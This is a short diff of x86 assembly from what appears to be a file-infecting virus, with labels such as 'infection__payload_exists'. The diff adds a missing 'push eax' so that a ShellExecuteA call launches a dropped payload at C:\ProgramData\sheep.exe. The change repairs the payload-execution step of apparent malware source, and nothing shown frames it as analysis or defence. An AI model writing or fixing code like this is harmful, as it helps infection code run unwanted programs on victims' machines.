@@ -86,6 +86,7 @@ infection__payload_exists:
    push 0
    push 0
    lea eax, [ebx+(infection__data__sheep-infection__data__start)]
+   push eax
    push 0
    push 0
    call edi                     ; ShellExecuteA(nullptr, nullptr, "C:\\ProgramData\\sheep.exe", nullptr, nullptr, 1)
